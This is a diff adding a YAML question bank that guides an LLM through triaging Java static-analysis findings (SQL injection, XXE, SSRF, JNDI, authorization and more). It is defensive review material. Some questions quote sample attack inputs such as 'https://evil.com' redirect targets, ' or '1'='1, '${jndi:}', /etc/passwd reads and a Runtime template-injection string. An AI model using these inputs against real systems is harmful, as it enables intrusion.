@@ -1,0 +1,784 @@
+# SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
+# Copyright (c) 2026 VinSOC Cyber
+
+# Guided Questions Templates for CodeQL/Semgrep Rules (LLM verification style)
+#
+# Questions MUST force the LLM to trace:
+#   1. WHERE variables are declared
+#   2. What their exact SIZES/VALUES are
+#   3. Whether sizes/values CHANGE through assignment or reallocation
+#   4. What CHECKS or CONSTRAINTS exist
+#   5. What OTHER variables feed into the target variables
+#
+# The LLM must answer ALL questions BEFORE giving a verdict.
+# This forces step-by-step reasoning instead of pattern matching.
+#
+# Language: Java
+#
+# Format:
+#   rule_id:
+#     short_description: Brief description of the vulnerability
+#     questions: List of questions to answer BEFORE verdict
+#     context_hint: What additional context helps (caller, struct, etc.)
+#     additional_context: List of context types that may be needed
+
+java/sql-injection:
+  short_description: "User input concatenated into SQL query in Java"
+  questions:
+    - "Where does the INPUT originate — HttpServletRequest.getParameter(), @RequestParam, @PathVariable, or another user-controlled source?"
+    - "Is the SQL text built with string concatenation or String.format(), or is every user value bound through ? or named placeholders (PreparedStatement.setX, setParameter)? Quote the lines."
+    - "If using JPA/Hibernate, is the input passed via createQuery() with string concatenation, or via setParameter() with named/positional params?"
+    - "Trace the INPUT — is it passed through any validation, escaping, or allowlist before reaching the query?"
+    - "Could SQL metacharacters (quotes, semicolons, UNION, comments) in the input alter the query structure?"
+    - "What database framework is used (JDBC, JPA, Hibernate, MyBatis, Spring JdbcTemplate) and does the usage follow its parameterized query API?"
+  context_hint: "Trace from request parameter through all assignments to query execution."
+  additional_context: ["caller"]
+
+java/xss:
+  short_description: "User input written to HTTP response without encoding in Java"
+  questions:
+    - "Where does the INPUT originate — HttpServletRequest.getParameter(), request body, database, or another source?"
+    - "Is the output written via response.getWriter().write(), PrintWriter, JSP expression (<%= %>), or a template engine?"
+    - "Is HTML encoding applied (OWASP Java Encoder, StringEscapeUtils.escapeHtml4(), or framework auto-escaping)?"
+    - "If using a template engine (Thymeleaf, Freemarker, JSP), is auto-escaping enabled and is th:utext or <c:out> used correctly?"
+    - "Could an attacker inject <script> tags or event handlers to execute JavaScript in the victim's browser?"
+    - "Is the output context HTML body, HTML attribute, JavaScript, CSS, or URL — each requires different encoding?"
+  context_hint: "Trace from input through all assignments to HTTP response output."
+  additional_context: ["caller"]
+
+java/command-injection: &java_command_injection
+  short_description: "User input passed to Runtime.exec() or ProcessBuilder in Java"
+  questions:
+    - "Where does the INPUT originate — HTTP request, file upload, database, or config?"
+    - "Is Runtime.getRuntime().exec(), ProcessBuilder, or Process used with user input?"
+    - "Is the command passed as a single string (Runtime.exec tokenises it on whitespace and runs no shell) or as a String[] / List with separate arguments, and is the launched program a shell (sh, bash, cmd.exe) given -c or /c?"
+    - "Is an allowlist used to validate the command or arguments against known-safe values?"
+    - "If using ProcessBuilder, is the command passed as a list of separate tokens rather than a single shell string?"
+    - "Could an attacker inject shell metacharacters (;|&$`) or additional arguments to alter execution?"
+  context_hint: "Trace from input through command construction to process execution, including all intermediate transformations."
+  additional_context: ["caller", "class"]
+  min_iterations: 2
+
+# Alias: CodeQL emits `java/command-line-injection` for CWE-78. Share the same
+# question bank as java/command-injection so the loader's exact-match path
+# fires for either rule_id.
+java/command-line-injection: *java_command_injection
+
+java/path-injection:
+  short_description: "User input used in file path allowing directory traversal in Java"
+  questions:
+    - "Where does the PATH input originate — request parameter, uploaded filename, API input?"
+    - "Is new File(), Paths.get(), or FileInputStream used with user-controlled path components?"
+    - "Is the path CANONICALIZED (File.getCanonicalPath() or Path.toRealPath()) and checked to be within the intended base directory?"
+    - "Could '../' or '..\\' sequences allow reading or writing files outside the intended directory?"
+    - "Is there an allowlist of permitted filenames, extensions, or path prefixes?"
+    - "On Windows, are alternate data streams (file.txt::$DATA) or reserved names (CON, NUL) checked?"
+  context_hint: "Trace from input through path construction to file I/O operation."
+  additional_context: ["caller"]
+
+java/unsafe-deserialization:
+  short_description: "ObjectInputStream.readObject() called on untrusted data enabling RCE"
+  questions:
+    - "Where does the SERIALIZED DATA come from — HTTP request body, cookie, RMI, JMS, file upload, database?"
+    - "Is ObjectInputStream.readObject() or XMLDecoder used on user-controlled data?"
+    - "Is a deserialization filter (ObjectInputFilter in Java 9+, or JEP 290 global filter) configured to restrict allowed classes?"
+    - "Are known-dangerous gadget chain libraries on the classpath (Commons Collections, Spring, Apache libraries)?"
+    - "Would using JSON (Jackson, Gson) or XML with safe parsers work as an alternative to Java serialization?"
+    - "Is there HMAC or signature validation on the serialized data before deserialization?"
+  context_hint: "Trace from data source to ObjectInputStream and identify gadget libraries on classpath."
+  additional_context: ["caller", "class"]
+
+java/xxe:
+  short_description: "XML parser configured to allow external entity resolution on untrusted input"
+  questions:
+    - "Which XML API is used — DocumentBuilderFactory, SAXParserFactory, XMLInputFactory, TransformerFactory, SchemaFactory?"
+    - "Is the XML input from an untrusted source — request body, uploaded file, API response?"
+    - "Is FEATURE_DISALLOW_DOCTYPE_DECL set to true, or is FEATURE_EXTERNAL_ENTITIES set to false?"
+    - "For XMLInputFactory, is XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES set to false?"
+    - "Could an attacker use a DOCTYPE + ENTITY to read local files (/etc/passwd), trigger SSRF, or cause DoS via entity expansion?"
+    - "Are BOTH external general entities AND external parameter entities disabled?"
+  context_hint: "Include XML parser factory creation, feature/property configuration, and input source."
+  additional_context: ["caller"]
+
+java/ssrf: &java_ssrf
+  short_description: "Server-side request forgery via user-controlled URL in Java"
+  questions:
+    - "Where does the URL come from — request parameter, database, configuration, or user input?"
+    - "Is URL, HttpURLConnection, HttpClient, RestTemplate, or WebClient used with user-controlled URLs?"
+    - "Is the URL validated against an allowlist of trusted domains or IP ranges before the request?"
+    - "Could an attacker specify internal IPs (127.0.0.1, 169.254.x.x, 10.x.x.x) to reach internal services?"
+    - "Is the URL scheme validated (http/https only — not file://, jar://, gopher://)?"
+    - "Is DNS resolution checked to prevent DNS rebinding attacks (resolving to internal IPs)?"
+  context_hint: "Trace from user input through URL construction to HTTP request execution."
+  additional_context: ["caller"]
+
+# Custom CodeQL query (renamed from java/ssrf to avoid built-in id collision)
+java/ssrf-ext: *java_ssrf
+
+java/ldap-injection:
+  short_description: "LDAP query built from user-controlled input in Java"
+  questions:
+    - "Where does the INPUT originate — HttpServletRequest.getParameter(), @RequestParam, or another user-controlled source?"
+    - "Is the input concatenated into an LDAP filter string (e.g., '(uid=' + username + ')')?"
+    - "Is the input ESCAPED using a proper LDAP filter encoding function before inclusion?"
+    - "Could an attacker inject LDAP metacharacters (* ( ) \\ NUL) to alter the filter — e.g., (uid=*) for auth bypass?"
+    - "What JNDI/LDAP API is used (DirContext.search(), LdapTemplate) and does it support parameterized filters?"
+    - "Would using SearchControls with parameterized filter arguments prevent this?"
+  context_hint: "Trace from request parameter through LDAP filter construction to search call."
+  additional_context: ["caller"]
+
+# ==============================================================================
+# Java - Logging and Information Exposure
+# ==============================================================================
+
+java/log-injection:
+  short_description: "Unsanitized user input written to logs enabling log forging"
+  questions:
+    - "Where does the LOG DATA originate — request parameters, headers, cookies, or user-controlled strings?"
+    - "Is Logger.info(), Logger.warn(), log.debug(), or System.out.println() used with unsanitized user input?"
+    - "Could an attacker embed newline characters (\\n, \\r) to inject fake log entries?"
+    - "Could injected entries mask real security events or mislead incident responders?"
+    - "Is the logging framework (Log4j, SLF4J, Logback) configured with a pattern that includes user-supplied values?"
+    - "Would stripping or encoding control characters (\\n, \\r, \\t) from user input before logging prevent this?"
+  context_hint: "Include the log call and the source of the logged data."
+  additional_context: ["caller"]
+
+java/information-exposure:
+  short_description: "Detailed error messages, stack traces, or internal paths exposed to users"
+  questions:
+    - "Is e.getMessage(), e.printStackTrace(), or the full exception object returned in the HTTP response?"
+    - "Does the error output reveal internal file paths, class names, database schema, or configuration?"
+    - "Is there a global exception handler (@ControllerAdvice, web.xml error-page) that returns generic error messages?"
+    - "Could an attacker deliberately trigger exceptions to enumerate the application's internal structure?"
+    - "Is this a development/debug configuration, or does it run in production?"
+    - "Who can observe this error output — end users via HTTP response, or only server-side log files?"
+  context_hint: "Include the exception handling code and where error details are sent."
+  additional_context: ["caller"]
+
+java/trust-boundary-violation:
+  short_description: "Untrusted data written into a trust-elevated container (HTTP session, cookie, header) without validation"
+  questions:
+    - "Where does the data originate — HttpServletRequest.getParameter(), getHeader(), getCookies(), or another user-controlled source?"
+    - "Where is it stored — HttpSession.setAttribute, response cookies / headers, or another trust-elevated container that downstream code treats as 'safe'?"
+    - "Is the data validated, sanitized, or canonicalised between source and sink? Against what allowlist, regex, or type-narrowing call?"
+    - "Could the stored value be read back later and used in a security-sensitive operation (auth check, command construction, redirect target, SQL/XPath query)?"
+    - "Is the data type-narrowed (Integer.parseInt, UUID.fromString, regex match) before storage, or stored verbatim as String / byte[]?"
+    - "What is the trust differential — does the storage container imply 'authenticated' or 'admin-supplied' data downstream?"
+  context_hint: "Trace from request parameter / header / cookie through any transformations to the session / cookie / header write, then to subsequent reads."
+  additional_context: ["caller", "class"]
+  min_iterations: 2
+
+# ==============================================================================
+# Java - Cryptography
+# ==============================================================================
+
+java/weak-cryptographic-algorithm: &java_weak_cryptographic_algorithm
+  short_description: "Weak or broken cryptographic algorithm (MD5, SHA1, DES, RC4) used in Java"
+  questions:
+    - "Which algorithm is used — MessageDigest.getInstance('MD5'), Cipher.getInstance('DES'), or similar?"
+    - "WHERE is the algorithm specified — a hardcoded string, a constant, loaded from properties/config, or derived from input?"
+    - "If loaded from config/properties: is that source attacker-controlled (user-writable file, HTTP-driven), or trusted (bundled classpath resource)?"
+    - "Is this hash/cipher used for PASSWORD STORAGE, where bcrypt/scrypt/Argon2 should be used instead?"
+    - "For hashing: is the hash used for integrity verification where collision resistance matters (MD5/SHA1 are broken)?"
+    - "For encryption: is DES, 3DES, RC4, or ECB mode used where AES-GCM or AES-CBC with HMAC should be used?"
+    - "Is this for a checksum or content ID where collision resistance is not security-critical?"
+    - "Is this for backward compatibility with an external system, and is there a migration path?"
+  context_hint: "Include the algorithm initialization, any config/property lookup that supplies the algorithm name, and how the result is stored or compared."
+  additional_context: ["caller", "global"]
+  min_iterations: 2
+
+# Alias: CodeQL emits `java/weak-cryptographic-hash` for CWE-328. Reuse the
+# same question bank so the loader's exact-match path fires for either rule_id.
+java/weak-cryptographic-hash: *java_weak_cryptographic_algorithm
+
+java/insecure-randomness:
+  short_description: "java.util.Random used for security-sensitive value instead of SecureRandom"
+  questions:
+    - "What is the random value used for — session token, CSRF token, password reset link, OTP, encryption key?"
+    - "Is java.util.Random or Math.random() used (predictable, seeded with system time)?"
+    - "Could an attacker observe previous outputs to predict future values using the Mersenne Twister state?"
+    - "Should java.security.SecureRandom be used instead for cryptographic strength?"
+    - "What is the security impact if the value is predictable — account takeover, CSRF bypass, token forgery?"
+    - "Is this in a test or simulation context where cryptographic strength is not needed?"
+  context_hint: "Include the Random instantiation and how the generated value is used."
+  additional_context: ["caller"]
+
+java/hardcoded-credentials:
+  short_description: "Hardcoded password, API key, or secret in Java source code"
+  questions:
+    - "Is this string a real credential used in production, or a placeholder/example/test value?"
+    - "Is this value committed to version control where it could be exposed?"
+    - "Could an attacker decompile the JAR/WAR to extract this credential?"
+    - "Should this be loaded from environment variables, a secrets vault (HashiCorp Vault), or Spring Cloud Config?"
+    - "What service does this credential grant access to, and what is the blast radius?"
+    - "Is this in a test class or configuration that is excluded from production builds?"
+  context_hint: "Include the credential usage and any configuration loading."
+  additional_context: []
+
+# ==============================================================================
+# Java - Web Security (Open Redirect, CSRF, Cookies)
+# ==============================================================================
+
+java/open-redirect:
+  short_description: "HTTP redirect to user-controlled URL enabling phishing"
+  questions:
+    - "Where does the REDIRECT TARGET come from — request parameter, header, database?"
+    - "Is response.sendRedirect(), ModelAndView redirect:, or Spring RedirectView used with user input?"
+    - "Could an attacker supply an absolute URL (https://evil.com) or protocol-relative URL (//evil.com)?"
+    - "Is there a check that the redirect stays on the same host (URL parsing and host comparison)?"
+    - "What is the phishing risk — users see a trusted domain before being redirected?"
+    - "Would redirecting only to relative paths or validating against a fixed allowlist prevent this?"
+  context_hint: "Include the redirect call and where the target URL originates."
+  additional_context: ["caller"]
+
+java/csrf:
+  short_description: "State-changing endpoint missing CSRF token validation"
+  questions:
+    - "Does this endpoint perform a state-changing operation (INSERT, UPDATE, DELETE, transfer, password change)?"
+    - "Is Spring Security's CSRF protection enabled (default in Spring Security), or explicitly disabled via csrf().disable()?"
+    - "If using a custom CSRF mechanism, is the token validated server-side on every state-changing request?"
+    - "Is this a REST API using token-based auth (JWT, Bearer) where CSRF is not applicable?"
+    - "Could an attacker craft a cross-origin form POST to trigger this action on behalf of a victim?"
+    - "Is SameSite=Strict or Lax set on session cookies as additional CSRF mitigation?"
+  context_hint: "Include the controller method, security configuration, and any CSRF token handling."
+  additional_context: ["caller"]
+
+java/insecure-cookie:
+  short_description: "Cookie set without Secure, HttpOnly, or SameSite attribute"
+  questions:
+    - "Which cookie is being set — session ID (JSESSIONID), auth token, CSRF token, remember-me?"
+    - "Is cookie.setSecure(true) called (prevents transmission over plain HTTP)?"
+    - "Is cookie.setHttpOnly(true) called (prevents JavaScript access, mitigates XSS cookie theft)?"
+    - "Is the SameSite attribute set via cookie.setAttribute('SameSite', 'Strict') or server configuration?"
+    - "Is this configured in web.xml, application.properties, or programmatically?"
+    - "Is the cookie domain scoped as narrowly as possible?"
+  context_hint: "Include the Cookie creation, all attribute settings, and response.addCookie() call."
+  additional_context: []
+
+# ==============================================================================
+# Java - Deserialization and Code Injection
+# ==============================================================================
+
+java/code-injection:
+  short_description: "User input used in runtime code execution (ScriptEngine, OGNL, SpEL, EL)"
+  questions:
+    - "Where does the INPUT come from — HTTP request, uploaded file, database field?"
+    - "Is ScriptEngine.eval(), OGNL.getValue(), SpEL ExpressionParser.parseExpression(), or EL ValueExpression used?"
+    - "Is there any SANDBOX or restricted context limiting what the evaluated expression can access?"
+    - "Could an attacker execute arbitrary Java code, access Runtime.exec(), or read/write files?"
+    - "For SpEL: is StandardEvaluationContext used (full access) instead of SimpleEvaluationContext (restricted)?"
+    - "Would treating user input as data (not code) or using an allowlist of permitted expressions prevent this?"
+  context_hint: "Trace from input to expression evaluation and identify the evaluation context."
+  additional_context: ["caller"]
+
+java/xpath-injection:
+  short_description: "XPath expression built from user-controlled input in Java"
+  questions:
+    - "Where does the INPUT originate — request parameter, header, or other user-controlled source?"
+    - "Is the input concatenated into an XPath string (e.g., '//user[name=\"' + name + '\"]')?"
+    - "Is the user value referenced as an XPath variable resolved through an XPathVariableResolver, or concatenated into the expression text? Quote the lines."
+    - "Could an attacker inject ' or '1'='1 to bypass authentication or extract document data?"
+    - "What XPath API is used — javax.xml.xpath.XPath, JDOM, DOM4J?"
+    - "Would using XPathVariableResolver or rejecting XPath special characters prevent this?"
+  context_hint: "Trace from input through XPath string construction to evaluation."
+  additional_context: ["caller"]
+
+# ==============================================================================
+# Java - Framework-Specific (Spring, Servlet)
+# ==============================================================================
+
+java/spring-actuator-exposed:
+  short_description: "Spring Boot Actuator management endpoints exposed without authentication"
+  questions:
+    - "Which Actuator endpoints are exposed — /actuator/env, /actuator/heapdump, /actuator/beans, /actuator/configprops?"
+    - "Is Spring Security configured to require authentication for Actuator endpoints?"
+    - "Is management.endpoints.web.exposure.include set to a restricted list (health, info only)?"
+    - "Could /actuator/env expose environment variables containing secrets (API keys, DB passwords)?"
+    - "Could /actuator/heapdump allow an attacker to download a heap dump containing in-memory secrets?"
+    - "Is the management port (management.server.port) configured to bind only to localhost or an internal network?"
+  context_hint: "Include application.properties/yaml security configuration and Actuator exposure settings."
+  additional_context: []
+
+java/missing-jwt-signature-check:
+  short_description: "JWT token accepted without verifying its signature"
+  questions:
+    - "Is the JWT parsed using an unsigned method (e.g., JWT.decode() without verification, Jwts.parser() without setSigningKey())?"
+    - "Could an attacker modify the JWT payload (claims, roles, user ID) and submit it without a valid signature?"
+    - "Could an attacker change the 'alg' header to 'none' to bypass signature verification?"
+    - "Is the signing key properly configured and kept secret (not hardcoded, not weak)?"
+    - "What JWT library is used (jjwt, Nimbus, Auth0 java-jwt) and does the usage follow its verified parsing API?"
+    - "What claims are trusted from the JWT — role, user ID, permissions — and what is the impact of tampering?"
+  context_hint: "Include JWT parsing/validation code and signing key configuration."
+  additional_context: ["caller"]
+
+# ==============================================================================
+# Java - Template Injection and Regex
+# ==============================================================================
+
+java/template-injection:
+  short_description: "User input used as template source enabling server-side template injection (SSTI)"
+  questions:
+    - "Where does the INPUT originate — request parameter, database field, CMS content?"
+    - "Is user input used as the TEMPLATE SOURCE (e.g., Velocity.evaluate(), freemarkerTemplate.process() with user string) rather than a template variable?"
+    - "Could an attacker inject template expressions (Velocity: $class.forName(), Freemarker: <#assign>, Thymeleaf: ${T(java.lang.Runtime)})?"
+    - "Is there a sandbox or restricted template configuration limiting access to Java classes?"
+    - "Would treating user input as a template variable (passed to render context) rather than template code fix this?"
+    - "What template engine is used (Velocity, Freemarker, Thymeleaf, Pebble) and what is its default security posture?"
+  context_hint: "Include template engine initialization and where user input enters the template."
+  additional_context: ["caller"]
+
+java/insecure-tls:
+  short_description: "TLS configuration using deprecated protocol versions or weak cipher suites"
+  questions:
+    - "Is SSLContext.getInstance() called with 'TLS', 'TLSv1', or 'TLSv1.1' instead of 'TLSv1.2' or 'TLSv1.3'?"
+    - "Are weak cipher suites (RC4, DES, 3DES, NULL, EXPORT, anon) included in SSLParameters.setCipherSuites()?"
+    - "Is the minimum protocol version enforced via SSLParameters.setProtocols() or jdk.tls.client.protocols?"
+    - "Could an attacker force a PROTOCOL DOWNGRADE attack to exploit BEAST, POODLE, or DROWN?"
+    - "Is this for development/testing only, or does it run in production?"
+    - "Is this connecting to a legacy system that only supports older TLS, and is there a migration plan?"
+  context_hint: "Include SSLContext creation and all protocol/cipher configuration."
+  additional_context: ["caller"]
+
+# ==============================================================================
+# Java - Resource and Concurrency
+# ==============================================================================
+
+java/resource-leak:
+  short_description: "I/O resource (stream, connection, statement) not closed in finally block or try-with-resources"
+  questions:
+    - "What resource is opened — InputStream, Connection, Statement, ResultSet, Socket, Channel?"
+    - "Is try-with-resources (try (Resource r = ...) { }) used, which guarantees close() on all paths?"
+    - "If not try-with-resources, is close() called in a finally block that handles exceptions from close() itself?"
+    - "Could the resource remain open if an exception is thrown between open and close?"
+    - "What is the impact of the leak — file descriptor exhaustion, database connection pool starvation, memory pressure?"
+    - "Are multiple resources opened in the same scope — are ALL of them properly closed?"
+  context_hint: "Include resource opening, all code paths, and closing logic."
+  additional_context: ["caller"]
+
+java/race-condition:
+  short_description: "Shared mutable state accessed without synchronization in concurrent context"
+  questions:
+    - "What shared state is accessed — instance field, static field, collection, counter, map?"
+    - "Is the class used in a multi-threaded context — servlet (shared across requests), singleton bean, executor task?"
+    - "Is the field declared volatile, or is access wrapped in synchronized blocks or using java.util.concurrent locks?"
+    - "Is a thread-safe collection (ConcurrentHashMap, CopyOnWriteArrayList) used instead of HashMap/ArrayList?"
+    - "Could a check-then-act or read-modify-write sequence be interleaved by concurrent threads?"
+    - "What is the impact — data corruption, authentication bypass, inconsistent state, lost updates?"
+  context_hint: "Include the class definition, shared fields, and all access points from different threads."
+  additional_context: ["caller", "class"]
+
+# ==============================================================================
+# Java - Data Exposure
+# ==============================================================================
+
+java/cleartext-storage:
+  short_description: "Sensitive data stored in cleartext without encryption in Java"
+  questions:
+    - "What sensitive data is being stored — password, token, API key, PII, credit card?"
+    - "Where is the data stored — database, SharedPreferences, file, cache, log?"
+    - "Is the data ENCRYPTED before storage (e.g., Cipher with AES-GCM, Jasypt, Spring Security Crypto)?"
+    - "For passwords: is BCryptPasswordEncoder, SCryptPasswordEncoder, or Argon2PasswordEncoder used?"
+    - "Could an attacker with database or file access read the sensitive data in plaintext?"
+    - "What is the blast radius if this data is exposed — account compromise, credential reuse, regulatory violation?"
+  context_hint: "Include the data source, storage call, and any encryption/hashing step."
+  additional_context: ["caller"]
+
+java/jndi-injection:
+  short_description: "User-controlled input passed to JNDI lookup enabling remote class loading (Log4Shell pattern)"
+  questions:
+    - "Does InitialContext.lookup(), DirContext.lookup(), or any JNDI API receive user-controlled input directly or indirectly?"
+    - "Is the input validated against an allowlist of trusted JNDI provider URLs before the lookup?"
+    - "Is the JVM system property com.sun.jndi.rmi.object.trustURLCodebase explicitly set to false?"
+    - "Is this application using Log4j 2.x (versions 2.0–2.14.1) where JNDI lookups in log messages are enabled by default?"
+    - "What JNDI provider is in use (RMI, LDAP, DNS, CORBA) and what Java version is running — newer JDKs restrict remote class loading?"
+    - "Are there compensating controls — WAF rules blocking ${jndi:}, network egress filtering, or deserialization filters (JEP 290)?"
+  context_hint: "Check JNDI lookup call site, JVM system properties, and Log4j configuration."
+  additional_context: ["caller", "global"]
+
+java/certificate-validation-disabled:
+  short_description: "TLS configuration allowing weak protocols or disabled certificate verification"
+  questions:
+    - "Is SSLContext.getInstance('TLS') or SSLContext.getInstance('SSL') used without specifying a minimum TLS version?"
+    - "Is a custom TrustManager implemented that accepts ALL certificates (X509TrustManager with empty checkServerTrusted)?"
+    - "Is HostnameVerifier.ALLOW_ALL or a no-op hostname verifier used?"
+    - "What SENSITIVE DATA is sent over this connection — credentials, tokens, PII?"
+    - "Is this for DEVELOPMENT/TESTING only, or does it run in production?"
+    - "Could an attacker perform a MAN-IN-THE-MIDDLE attack by presenting a forged certificate?"
+  context_hint: "Include SSLContext setup, TrustManager, HostnameVerifier, and what data is transmitted."
+  additional_context: ["caller"]
+
+# ==============================================================================
+# Java - File Upload and Input Validation (CWE-434, CWE-20)
+# ==============================================================================
+
+java/file-upload:
+  short_description: "Unrestricted file upload via MultipartFile or Part without type/size validation (CWE-434)"
+  questions:
+    - "Where does the uploaded file come from — MultipartFile, javax.servlet.http.Part, or a multipart request body?"
+    - "Is the file's CONTENT TYPE validated server-side (not just the client-provided Content-Type header, which is attacker-controlled)?"
+    - "Is the file EXTENSION checked against an allowlist of safe types (e.g., .png, .jpg, .pdf) rather than a denylist?"
+    - "Is the file saved to a location OUTSIDE the web root, or could an attacker upload a .jsp/.war file that the server will execute?"
+    - "Is the filename SANITIZED to prevent path traversal (../) and overwriting existing files?"
+    - "Is there a maximum file SIZE enforced server-side (not just client-side) to prevent DoS via large uploads?"
+  context_hint: "Include the upload handler, file storage path, and any validation logic."
+  additional_context: ["caller"]
+
+java/input-validation:
+  short_description: "User input used without validation allowing unexpected values (CWE-20)"
+  questions:
+    - "Where does the INPUT originate — @RequestParam, @RequestBody, @PathVariable, @RequestHeader?"
+    - "Is @Valid or @Validated used on the DTO/entity with Bean Validation constraints (@NotNull, @Size, @Pattern)?"
+    - "If no Bean Validation, is MANUAL validation performed — null checks, range checks, format checks — before the input is used?"
+    - "Could unexpected values (negative numbers, empty strings, extremely long strings, special characters) cause incorrect behavior?"
+    - "Is the input used in security-sensitive operations (authorization decisions, file paths, queries) where bad values have security impact?"
+    - "Does the controller have a @ControllerAdvice or MethodArgumentNotValidException handler to reject invalid input?"
+  context_hint: "Include the controller method signature, DTO class with annotations, and how input is used."
+  additional_context: ["caller", "class"]
+
+# ==============================================================================
+# Java - Authentication and Authorization (CWE-306, CWE-862, CWE-863, CWE-287)
+# ==============================================================================
+
+java/missing-authentication:
+  short_description: "Endpoint accessible without authentication performing privileged actions (CWE-306)"
+  questions:
+    - "Quote the EXACT endpoint signature the rule flagged (@RequestMapping/@GetMapping/@PostMapping/etc.) with line number, and the privileged action it performs."
+    - "What SPECIFIC authentication mechanism would satisfy the rule? Name it concretely — e.g. '@PreAuthorize(\"isAuthenticated()\")', 'SecurityFilterChain.authorizeHttpRequests().anyRequest().authenticated()', 'manual SecurityContextHolder.getContext().getAuthentication() check'. 'Some authentication' is not acceptable."
+    - "Enumerate EVERY path an unauthenticated request can take to reach this endpoint: direct URL hit, internal forwarder, async handler, scheduled invoker. For each, state whether the SPECIFIC mechanism from the previous question is present with file:line citations. Mark unseen configuration as 'Not visible — assumption of guard rejected'."
+    - "Is this endpoint EXPLICITLY listed in a permitAll() / WebSecurityCustomizer.ignoring() block? Quote the line if so."
+    - "If you cannot point to the specific required authentication mechanism on EVERY reachable path with concrete line numbers, the rule is likely correct. To verdict False Positive, cite (a) the mechanism, (b) where it is enforced, (c) why every reachable path executes it."
+    - "What is the security impact if an unauthenticated caller reaches this endpoint?"
+  context_hint: "Include the controller method, Spring Security configuration, and any authentication annotations."
+  additional_context: ["caller", "all_callers", "class"]
+  min_iterations: 2
+
+java/missing-authorization:
+  short_description: "Authenticated endpoint missing role or permission check (CWE-862)"
+  questions:
+    - "Quote the EXACT endpoint and the action it performs (line number). What RESOURCE or PRIVILEGE does the rule expect to be gated?"
+    - "What SPECIFIC authorization check satisfies the rule? Name it concretely — e.g. '@PreAuthorize(\"hasRole(\\'ADMIN\\')\")', '@PostAuthorize(\"returnObject.owner == authentication.name\")', 'manual SecurityContextHolder check for AUTHORITY_X'. 'A role check' is not acceptable."
+    - "Enumerate EVERY path an authenticated-but-unprivileged user can take to reach this endpoint. For each path, list the SPECIFIC required check with file:line citation, or mark 'absent / not visible'."
+    - "Is OBJECT-LEVEL authorization required (the user owns/may modify THIS specific resource), and if so, is that ownership check present with the right identity (authenticated user vs path parameter)?"
+    - "Is Spring Method Security enabled (@EnableMethodSecurity / @EnableGlobalMethodSecurity)? Quote the enabling annotation, or mark 'Not visible'."
+    - "If the SPECIFIC required check is not present on every reachable path, the rule is likely correct. To verdict False Positive, cite (a) the check, (b) its location, (c) why every path executes it before the business logic."
+  context_hint: "Include the controller method, security annotations, and how the user's role/authority is checked."
+  additional_context: ["caller", "all_callers", "class"]
+  min_iterations: 2
+
+java/incorrect-authorization:
+  short_description: "Authorization check performed on wrong object or with incorrect logic (CWE-863)"
+  questions:
+    - "Quote the EXACT authorization check the code performs AND the EXACT resource access it gates, both with line numbers."
+    - "What SPECIFIC check would actually satisfy the rule for the resource being accessed? (e.g. 'resource.owner.equals(currentUser)', 'hasAuthority(\"X\") AND resource.acl.contains(user)'.) 'A permission check' is not acceptable."
+    - "Compare the check the code performs to the SPECIFIC check required: do they reference the same identity (current user vs path parameter vs principal name) and the same resource? Cite line numbers for both."
+    - "Could an attacker change a resource ID in the request to access ANOTHER user's data (IDOR)? Show whether the check rebinds the resource ID to the authenticated user."
+    - "Is the role/permission string compared with equals(), contains(), or a typo-prone literal — could a mismatch make the check always pass or always fail?"
+    - "If the check performed differs from the check required on any reachable path, the rule is likely correct. To verdict False Positive, cite the matching check on every path."
+  context_hint: "Include the authorization check, resource lookup, and all endpoints accessing this resource."
+  additional_context: ["caller", "all_callers", "class"]
+  min_iterations: 2
+
+java/broken-authentication:
+  short_description: "Weak authentication mechanism allowing credential compromise (CWE-287)"
+  questions:
+    - "Quote the EXACT authentication-handling statement the rule flagged (password comparison, session creation, JWT verification, etc.) with line number."
+    - "What SPECIFIC mechanism would satisfy the rule on this code? Name it concretely — e.g. 'MessageDigest.isEqual(...) constant-time compare', 'BCryptPasswordEncoder.matches()', 'Jwts.parserBuilder().setSigningKey(...).build().parseClaimsJws(...)'. 'Proper authentication' is not acceptable."
+    - "Enumerate EVERY authentication path that reaches the flagged code (login form, API token, refresh, password-reset, SSO callback). For each, state which SPECIFIC mechanism is used, with file:line citations."
+    - "Could an attacker bypass any of these paths via parameter manipulation, default credentials, type juggling, or a missing-check alternate path? Quote the path if so."
+    - "Is BRUTE-FORCE protection (lockout, rate limit, CAPTCHA) enforced on every path? Quote the mechanism or mark 'Not visible'."
+    - "If the specific required mechanism is not present on every authentication path with concrete line numbers, the rule is likely correct."
+  context_hint: "Include the authentication flow, password verification, and session creation logic."
+  additional_context: ["caller", "all_callers", "class"]
+  min_iterations: 2
+
+java/improper-privilege-management:
+  short_description: "Privilege escalation via role manipulation or missing privilege boundary (CWE-269)"
+  questions:
+    - "Quote the EXACT statement the rule flagged (role assignment, privilege check, mass-assignment binding, @RunAs, etc.) with line number."
+    - "What SPECIFIC guard would satisfy the rule on this operation? Name it concretely — e.g. 'admin-only @PreAuthorize before role mutation', 'allow-list of bindable fields excluding role/admin', 'explicit revoke of elevated privilege in a finally{} block'. 'A privilege check' is not acceptable."
+    - "Enumerate EVERY path that can reach the flagged statement: registration, profile update, admin panel, mass-assignment via DataBinder. For each, state whether the SPECIFIC guard is present with file:line citations."
+    - "Can a low-privileged user influence the inputs to this operation (role field, target user ID, request body)? Quote the data flow if so."
+    - "Are elevated privileges granted transiently (e.g., @RunAs, SecurityContextHolder mutation) and is the revoke guaranteed on every exit path (including exceptions)?"
+    - "If the specific required guard is not present on every reachable path, the rule is likely correct."
+  context_hint: "Include role assignment logic, user update endpoints, and privilege check code."
+  additional_context: ["caller", "all_callers", "class"]
+  min_iterations: 2
+
+# ==============================================================================
+# Java - Resource Exhaustion and DoS (CWE-770, CWE-776, CWE-1333)
+# ==============================================================================
+
+java/resource-exhaustion:
+  short_description: "Unbounded resource allocation from user-controlled input enabling DoS (CWE-770)"
+  questions:
+    - "Is the SIZE or COUNT of an allocation (array, list, buffer, thread pool) controlled by user input without an upper bound?"
+    - "Could an attacker send a request with size=2147483647 to cause OutOfMemoryError or extreme CPU consumption?"
+    - "Is there a server-side MAXIMUM enforced — @Max annotation, manual bounds check, or configuration limit?"
+    - "Is pagination enforced on database queries — could an attacker request page_size=1000000 to exhaust memory?"
+    - "Are streaming APIs used for large data (InputStream, Flux) instead of loading everything into memory?"
+    - "Is there a request timeout, memory limit, or circuit breaker that would prevent a single request from consuming excessive resources?"
+  context_hint: "Include the allocation site, user input source, and any size validation."
+  additional_context: ["caller"]
+
+java/xml-bomb:
